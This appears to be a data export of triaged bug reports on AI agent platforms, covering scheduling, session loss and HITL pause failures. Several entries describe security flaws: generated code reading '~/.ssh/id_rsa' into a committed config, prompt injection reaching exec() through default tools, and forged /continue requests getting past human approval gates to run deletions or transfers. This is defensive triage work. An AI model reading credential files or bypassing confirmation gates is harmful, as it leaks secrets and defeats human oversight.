signals.review_reason: 凭据类敏感文件读取无 warning 可能导致真实泄露风险（虽为对抗性测试验证的单条记录），属安全影响明显的场景；但因单条且为对抗性验证而非高频主流程，定为 P2。

source_issues.title: Generated code can read SSH private keys outside the project directory without warning
source_issues.evidence: 实测生成的代码 os.path.expanduser('~/.ssh/id_rsa') 读取私钥写入 config['SSH_KEY_BACKUP'] 并提交，无警告（lines 463-503）。

signals.topic: 定时调度（Scheduling）功能异常：调度不可靠导致任务错日执行、未生效、误恢复或无法暂停管理
signals.summary: AutoGPT 平台的定时调度存在多处缺陷：调度名称留空时后台返回 500 且无客户端校验；按星期调度周报任务会偏移一天（设置周六却在周日执行）；重新启用（re-hire）专家会恢复用户刻意暂停的调度，导致任务未经请求再次触发；已暂停的调度在面板中无法恢复。这些问题共同使用户无法可靠地依赖调度功能管理定时任务，可能导致任务错时执行、意外触发或丢失。
signals.review_reason: 这是用户可感知的定时任务可靠性问题：设置周六却在周日运行、调度名称留空导致 500、re-hire 后任务未经请求擅自恢复运行、暂停后无法在面板恢复。错日执行可能让按周/按日任务产生计划外结果与花费，re-hire 误恢复会造成意外触发，均直接破坏工作流的关键主流程可靠性。多份真实用户与维护者证据表明反复出现，属于明显可感知的非阻断性缺陷（P1）。

source_issues.title: Schedule name required in builder but not enforced in scheduling tool — causes 500
source_issues.evidence: 表单提交成功后后台因调度名缺失返回 500，用户得到静默/困惑的错误，无任何提示说明问题原因。

source_issues.title: Scheduled time and Actual run time do not match
source_issues.evidence: 真实用户报告：设置每周六运行的 agent 实际却在每周日运行——星期计算存在 off-by-one 偏移 bug，导致任务错日执行继续产生费用/结果。

source_issues.title: fix(backend): re-hiring an expert resumes schedules the user had deliberately paused
source_issues.evidence: pause 某个专家每日报告、archive 再 re-hire 该专家后，报告未经请求又开始触发——系统无法区分用户主动暂停与归档暂停，恢复时误恢复了刻意暂停的任务。

source_issues.title: fix(frontend): a paused schedule can be deleted from the panel but not resumed there
source_issues.evidence: 暂停后的调度在面板中只有 View 和 Delete 两个动作，恢复需在 chat 中进行；面板上最接近的控制是 Delete，会永久丢失节奏且无法撤销。

signals.topic: LLM 块执行失败：UI 可选模型但在后端因 Model ID 无法解析而返回 400（BlockUnknownError）
signals.summary: Agent Builder / Copilot 中部分新模型的名称在 UI 层可选，但后端 AITextSummarizerBlock、AIListGeneratorBlock 等未能把内部别名正确映射到 provider 实际 Model ID，导致调用 Anthropic/OpenRouter 代理时返回 400 invalid model ID，块直接抛 BlockUnknownError，用户无法使用所选模型。
signals.review_reason: 新模型在界面上可选、实际上调用即失败并抛 BlockUnknownError，直接阻断用户使用该模型的整条流程，且发生在主流程执行环节，属于关键功能不可用的典型场景——用户按要求选择模型却得到 400 错误，无法完成任务。虽只在两处出现且可能与特定模型版本相关，但对受影响用户构成明确的主流程阻断，故判定为 P1。

source_issues.title: BlockUnknownError: raised by AIListGeneratorBlock with message: Error calling LLM: Error code: 400 - 'anthropic/claude-sonnet-4-5-20250929 is not a valid model ID'
source_issues.evidence: AIListGeneratorBlock 调用 LLM 时返回 400 not a valid model ID，块抛出 BlockUnknownError 阻断流程。

source_issues.title: Model ID mismatch in AITextSummarizerBlock for Claude 4.7 aliases
source_issues.evidence: 发布 v0.6.58 / 新增 Claude Opus 4.7 支持后，用户在 Agent Builder 中尝试使用该模型时，模型在 UI 中可选、但后端 AITextSummarizerBlock 和 AIListGeneratorBlock 无法把内部别名映射为 provider ID，导致 400 invalid model ID 失败。

signals.topic: web_fetch 工具截断页面内容：100KB 原始 HTML 上限且不渲染 JS，导致 Copilot 在缺少关键内容时仍然答题
signals.summary: copilot 的 web_fetch 在转换前按原始 HTML 上限 100KB 截断，且不执行 JS 渲染。现代文档页首 100KB 多为导航/样式/脚本，正文（如表单、价格区）被切断；纯客户端渲染页面只返回导航壳。工具未明确提示内容缺失，Copilot 会像已拿到整页一样继续作答，形成隐藏的错误答案，浪费用户时间与 token。
signals.review_reason: 这是信息获取质量缺陷，会导致 Copilot 基于不完整的页面内容给出看似正常实则错误的答案（定价页无价格却判为已掌握），直接损害任务结果正确性并浪费 token 成本，且失败是隐藏的、用户难以察觉。虽有明确 trace 证据，但仅单个 issue，影响为体验与成本损失而非主流程异常中断，故判定 P2。

source_issues.title: web_fetch drops page content: 100 KB raw-HTML cap and no JavaScript rendering
source_issues.evidence: 在 copilot trace 抽样中，62 次成功的 web_fetch 调用里有 9 次（生产环境 5%）返回的真实内容不足 600 字符；有一次 Copilot 在抓取到不含价格的定价页后说“我现在掌握了所需的一切”——隐藏失败。

signals.topic: Tabby 任务静默失败且无任何错误日志，用户无提示且无法获知失败原因
signals.summary: 用户在 Cloud Provider (Modal) 场景下运行 Context Provider 文档生成任务时失败，界面上没有任何错误提示或日志输出，任务静默中断。用户只能自行猜测是 Modal 的 container_idle_timeout 关闭了容器导致，缺乏官方处理指引。
signals.review_reason: 任务(文档生成)静默失败且没有任何错误日志或提示，属于阻断用户完成关键功能(获取上下文文档)的可用性痛点——用户不仅无法完成任务，还因缺乏诊断信息无法自行定位根因，只能归咎于第三方容器空闲超时策略。虽然该 issue 带 bug-unconfirmed 标签、评论数为 0、用户自己也倾向认为可能是配置问题而非 Tabby 缺陷(证据强度中等)，且仅单仓单例(count=1)，但'静默失败+无日志'直接损害用户体验，故保留但定为 P2，不视为高频主流程故障。

source_issues.title: Cloud Provider Modal | Context Provider : the jobs failed silently
source_issues.evidence: 用户在获取 python3 文档时任务失败，'it failed without any error or even job that don't show any logs'，界面上既无错误信息也无任务日志，只能猜测是 Modal container_idle_timeout=300 关闭容器所致，并自述 'I think that this isn't really a bug and I just need to prevent Modal to close the container'，说明缺乏可用的失败诊断信息。

signals.topic: Sessions in Goose Desktop become permanently stuck or unresumable after a failed load/replay, forcing a daemon restart or abandoning the session
signals.summary: Multiple distinct bugs leave users unable to reopen or continue their own sessions: a failed provider restore caches the agent without a provider so retries never re-attempt restore and the session is stuck at "Provider not set" until daemon restart; long sessions permanently fail to open in Desktop because session/load replay overruns the ACP transport queue and drops the connection; and Databricks-resident empty-text thinking blocks make every resume replay invalid to Anthropic, leaving affected sessions unresumable.
signals.review_reason: Users lose access to their own prior work: sessions hand back the same error forever and do not self-recover, requiring a process restart or manual session-store editing. This is a repeated, blocking resource unavailability (not a cosmetic issue) that directly prevents resuming ongoing tasks.

source_issues.title: Failed provider restore poisons the agent cache: session stuck at "Provider not set" until daemon restart, even after credentials are fixed
source_issues.evidence: When a session's provider fails to restore on load (e.g. expired AWS SSO token), the agent is cached without a provider; every retry hits the cache fast path and fails with opaque 'Provider not set', and even after 'aws sso login' the restore is never re-attempted — only a full desktop restart recovers the session.

source_issues.title: Long sessions become permanently unopenable in the desktop: `session/load` replay outruns the ACP transport and the connection is dropped
source_issues.evidence: Any session long enough for the SQLite replay to get ~1024 notifications ahead of the wss:// writer is permanently unopenable in Desktop with 'Failed to Load Session — ACP connection closed', while the identical session loads fine from the CLI. Reproducer shows wss fails at ~1674 msgs/~28 MiB while ws:// succeeds.

source_issues.title: Databricks Claude sessions persist empty-text thinking blocks and cannot resume
source_issues.evidence: Claude/Opus thinking blocks through databricks_v2 are stored with empty text and a signature; on resume Anthropic rejects the signature so every subsequent request fails and the session is unresumable. On the reporter's machine 29 of 564 thinking blocks from 32 sessions were broken.

signals.topic: Custom OpenAI-compatible provider model settings are silently ignored or host config quirks break requests (context window, max_tokens, /v1 path)
signals.summary: For custom/declarative OpenAI-compatible providers: API discovery ignores a host's declared context window so models run at a hardcoded 128k and get compacted prematurely; a per-model max_tokens field is silently dropped by serde with no warning or effect; and pointing the base URL at something already ending in /v1 yields a 400 on the /v1/models probe. Users get no error, no log, and often no UI way to compensate.
signals.review_reason: Configuration that users legitimately write has no effect at best (wasted tokens / premature compaction) and errors at worst, with zero diagnostics and no UI affordance to fix it. This leads to real cost and quality loss (unnecessary compaction, unbounded output) for anyone on a custom gateway.

source_issues.title: Bug: Custom OpenAI-compatible providers (Lemonade): 256k context window ignored — discovery doesn't read Lemonade's /v1/models fields, and the desktop custom-provider form has no way to set a model's context limit
source_issues.evidence: Discovery only reads llama.cpp meta.n_ctx and falls back to DEFAULT_CONTEXT_LIMIT=128k, so a 256k model runs at 128k and compacts prematurely; the desktop form has no context-window field and re-saving discards any manually added context_limit, so the only workaround is handediting the JSON file.

source_issues.title: custom provider model field `max_tokens` is silently ignored
source_issues.evidence: Writing 'max_tokens': 8192 in a declarative custom-provider model entry has zero effect and zero feedback: ModelInfo has no max_tokens field and no deny_unknown_fields, so serde silently drops it and the outgoing request never honors the cap.

source_issues.title: Custom OpenAI-compatible provider GET /models 400 when API URL already ends with /v1
source_issues.evidence: When a user enters a base URL already ending in /v1, the client appends /models to form a wrong /v1/models path and the probe returns HTTP 400, breaking provider setup with no indication of the cause.

signals.topic: Provider streaming/response edge cases silently end the turn with zero output and no error, so the agent appears to stop mid-task
signals.summary: When a provider returns a thinking-only response (reasoning with no text/tool call) the reply loop treats the turn as productive and exits silently — goose exits rc=0 with no output, no log, no retry; and a streaming response missing the optional created_at field hard-fails the parser so the incoming message is never rendered. Both leave the user staring at a stopped agent with no explanation.
signals.review_reason: The agent stops mid-task with no output and no error, so the user cannot tell whether work is done, failed, or pending — repeated real-world occurrences reached minutes-long silent stalls. These are main-loop failures that directly damage usability even though they are provider-compatibility-shaped.

source_issues.title: A response containing only a thinking block silently ends the turn
source_issues.evidence: A response whose only content is a reasoning block is treated as productive: goose run exits rc=0 in ~0.5s printing only the banner — no answer, no error, no warning. In a real session two thinking-only turns made the user wait 19.3 and 15.3 minutes before giving up; the whole retry budget was spent inside seconds while a fresh turn 18-30s later succeeded 5/5.

source_issues.title: Stream decode error: Failed to parse Responses stream event: missing field `created_at`
source_issues.evidence: A custom OpenAI-compatible provider emits a response.created event without the optional created_at field; the strict deserializer aborts the stream, so every prompt fails to render with 'Stream decode error' immediately after sending.

signals.topic: Large-session compaction holds the SQLite write lock for minutes, failing concurrent sessions and discarding completed work
signals.summary: Compacting a session with several thousand messages re-runs an unindexed (session_id, message_id) lookup for every message inside one BEGIN IMMEDIATE transaction, holding the write lock on sessions.db for 147–179s. Any other session writing during that window hits the 30s busy_timeout, fails with database is locked, and the CLI drops the entire turn — losing work the model had already done.
signals.review_reason: One user's background compaction silently makes another user's active session fail and discards work the model had already completed. The lock duration (minutes) and the loss of finished turns are concrete, repeated negative outcomes, not a theoretical concern.

source_issues.title: Compacting a large session holds the SQLite write lock for minutes and fails other sessions with database is locked
source_issues.evidence: Measured 147s/150s/~179s lock holds during compaction of an 11,843-message session; a second concurrent session failed with '(code: 5) database is locked' and the CLI dropped the turn (removed conversation up to most recent user message). Timing shows the loop is quadratic and grows past the 30s busy_timeout around 5,000 messages.

source_issues.title: Compacting a large session holds the SQLite write lock for minutes and fails other sessions with database is locked
source_issues.evidence: Duplicate report of the same defect: compaction holds the write lock minutes, other sessions fail with database is locked, and the CLI drops the turn, losing already-performed work.

signals.topic: Vision-capable models silently strip or omit images (uploaded and tool-result images), so multimodal inputs never reach the model
signals.summary: Users on custom/OpenAI-compatible and local providers report that images are silently dropped even though the underlying model is multimodal — an uploaded photo is not recognized, and tool-result images are omitted on the serve/CLI path. The capability flag is not consulted at runtime for these providers, so there is no error, just loss of multimodal input.
signals.review_reason: Multimodal capability is advertised by the model but silently unused, so image-based tasks (reading a screenshot, analyzing an uploaded photo) silently fail or work blind without any diagnostic. This significantly degrades functionality for affected providers and is a genuine, user-visible data loss, though it is confined to specific provider paths.

source_issues.title: 上传图片，不能识图，模型本来是多模态的
source_issues.evidence: User uploads an image and the model cannot recognize it although the model is natively multimodal; the image is not passed through on the custom-provider path.

source_issues.title: Tool-result images are always omitted for custom/declarative OpenAI-engine providers — supports_vision is never resolved on the serve/CLI path
source_issues.evidence: For custom/declarative OpenAI-engine providers, tool-result images are always omitted because supports_vision is never resolved on the serve/CLI path, so the multimodal payload is silently dropped.

signals.topic: 会话/运行状态静默丢失：DB 异常、非 JSON 可序列化值、user_id 不匹配或并发写导致聊天历史与 HITL 暂停状态被静默丢弃且无任何错误信号
signals.summary: 存储层多处缺陷都表现为保存静默失败：_storage.py 的 session I/O 包装函数 catch 掉所有 DB 异常并返回 None，使瞬态连接故障被当成'会话不存在'而重建空 AgentSession，聊天历史/tool 历史/session_state 全部静默丢失；upsert_session 在存量行 user_id 与新 payload 不一致时命中 WHERE 谓词为假而静默返回 None，导致 HITL 暂停状态无法恢复；并发 arun 共用同一 session_id 时整个 runs JSONB 数组被后写覆盖；run 内出现非 JSON 可序列化值(如 Decimal)时整行保存被静默丢弃。均无异常、无告警，调用方无从感知。
signals.review_reason: 这是明确的用户数据丢失痛点：聊天历史、工具历史、session_state、HITL 暂停状态在瞬态 DB 故障/并发/数据格式/租户边界切换时被静默丢弃，且框架不抛错、不告警，应用层无法感知也无力恢复。对任何使用持久化后端的 Agent 应用都会静默吞掉对话状态并导致 HITL 断点不可续传，直接影响主流程连续性。这些是已在真实使用中反复出现并造成数据损失的确切缺陷。

source_issues.title: session I/O wrappers in _storage.py swallow DB exceptions and return None, causing silent session data loss
source_issues.evidence: read_session/upsert_session catch 所有 Exception 返回 None，read_or_create_session 将瞬态 DB 故障当作无会话并新建空 AgentSession，聊天历史与 session_state 被静默丢弃；写失败也无感知。

source_issues.title: Session runs lost under concurrent writes — upsert_session overwrites entire JSONB runs array
source_issues.evidence: 并发 arun 共用 session_id 时，后写方以整列替换覆盖 runs JSONB 数组，先完成运行的记录被静默丢弃，无错误无告警。

source_issues.title: upsert_session silently drops upserts when stored user_id != new user_id
source_issues.evidence: Sqlite/Postgres upsert_session 因 ON CONFLICT 上的 user_id WHERE 谓词为假而静默返回 None，保存被丢弃，调用方无信号。

source_issues.title: upsert_session silently fails when row's existing user_id differs from new payload's user_id
source_issues.evidence: 与 7986 同根因；作者称'这是最致命 bug——每个 HITL 暂停/恢复周期都静默丢数据'。

source_issues.title: Session save is silently dropped when a run contains a non-JSON-serializable value
source_issues.evidence: SqliteDb.upsert_session 遇非 JSON 可序列化值(Decimal/metadata)整行保存失败且只打 WARNING，paused HITL run 因此静默不可恢复。

signals.topic: Workflow 中 HITL 暂停/续跑在多种配置下失效：自定义 executor Step、嵌套 Parallel/Steps、流式循环、暂停中被取消等场景导致 pause 被丢弃或 resume 报错不可恢复
signals.summary: 多个 Workflow HITL 场景断裂：Step(executor=<自定义函数>) 编排 Team/Agent 时 member 的 pause 被端到端丢弃(仅 Step(agent=)/Step(team=) 可用)；嵌套在 Parallel/Steps 里的 human_review 确认静默不暂停；HITL 拒绝后流式模式下 Loop 迭代从第 0 次重新开始；resume 会丢 run_context 使 resume 后 session_state 写入静默丢失；暂停中被取消时子 run 与 workflow run 状态矛盾导致 resume 报 RunNotContinuableError 而永久卡死在 PAUSED。自定义 executor 是官方文档推荐的非平凡编排写法，故该类工作流完全被排除在工具级 HITL 之外。
signals.review_reason: 这是 HITL(人机回环)核心功能在常用 Workflow 编排场景下的阻断性缺陷：官方文档推荐的自定义 executor、嵌套 Step、流式循环、暂停中取消，都会导致人工确认 pause 被静默丢弃或续跑直接报错不可恢复，使用户无法在关键工具执行/资金确认处插入人工把关，流程被卡死或确认被绕过。对依赖 HITL 的合规性工作流是关键能力不可用。

source_issues.title: [Bug] HITL pause from a custom function-executor Step is dropped end-to-end
source_issues.evidence: Step(executor=<自定义函数>) 编排 Team 时 member 的 requires_user_input pause 在五处被静默丢弃，无法暂停也无法续跑；仅 Step(agent=)/Step(team=) 可用。

source_issues.title: [Bug] HITL resume can break when a paused executor sub-run is cancelled but its workflow run stays PAUSED
source_issues.evidence: 生产 2.6.6-2.6.11 观察：暂停中断开 SSE 使子 run 变 CANCELLED 而 workflow 仍 PAUSED，resume 被自身 RunNotContinuableError 拒绝，工作流永久无法续跑。

source_issues.title: Workflow: human_review confirmation on a Step nested inside Parallel/Steps silently never pauses
source_issues.evidence: 嵌套在 Parallel/Steps 中 Step 的 human_review 确认静默不暂停(agno 3.0.9/3.0.10)，HITL gate 被绕过。

source_issues.title: [Bug] Loop iteration resume after HITL rejection restarts from iteration 0 in streaming mode
source_issues.evidence: 流式模式下 HITL 拒绝后 Loop 迭代 resume 从第 0 次重来(非流式正确)，续跑失败。

source_issues.title: Workflow executor-HITL resume drops run_context: session_state writes after resume are silently lost
source_issues.evidence: resume 过程中 run_context 丢失，resume 后对 session_state 的写入被静默丢弃。

signals.topic: 工具执行确认门缺失与可绕过：默认装配下模型可触发任意代码执行，且 /continue 信任客户端传来的确认状态可绕过要求人批的工具门、跨用户覆盖运行记录
signals.summary: 两条独立安全缺陷共同暴露工具执行不可信：默认 Agent 装配(如 PythonTools)下 requires_confirmation 默认关闭，编排循环直接执行模型要求的 run_python_code 到达 exec()，对处理不可信内容(网页/文档/聊天，即提示注入)的 Agent 可实现任意代码执行(CWE-913, CVSS 9.8)；AgentOS 的 POST /continue 仅凭客户端 body 里的 confirmed/approval_type 即执行确认门控工具，可伪造注定工具调用或自我通过 pending 的 required 审批而真实触发转账/删除；另有 create-run 端点信任调用方 run_id，若冲突则静默覆盖(含他人)运行行。
signals.review_reason: 这不是泛化的'安全漏洞'公告，而是带离线可复现 PoC 的框架默认配置缺陷，直接影响真实用户：任何把 agno 嵌入处理不可信内容的 Agent 都可能被执行任意代码而泄露密钥/破坏文件；HITL 资金确认门可被伪造请求绕过，直接造成转账/删除等未授权副作用；run_id 冲突导致跨用户数据被静默覆盖。均有明确用户影响证据与复现路径。

source_issues.title: [Bug] Agent orchestration executes model-requested tool calls without a default confirmation gate, allowing arbitrary code execution
source_issues.evidence: 默认装配下 run_python_code 的 requires_confirmation 默认 False，编排循环立即执行，代码串直达 exec()；PoC 离线复现 marker 被写入，CVSS 9.8。

source_issues.title: [Bug] AgentOS /continue trusts client-supplied approval state, bypassing tool confirmation gates
source_issues.evidence: PoC 复现：伪造 tool_call 在 COMPLETED run 上实现 delete_everything；对 pending 的 required 审批自我确认后执行 wire_transfer 且 DB 记录仍 pending。

source_issues.title: [Security] AgentOS create-run endpoints honor caller-supplied run_id; conflicting IDs silently overwrite existing runs (cross-user)
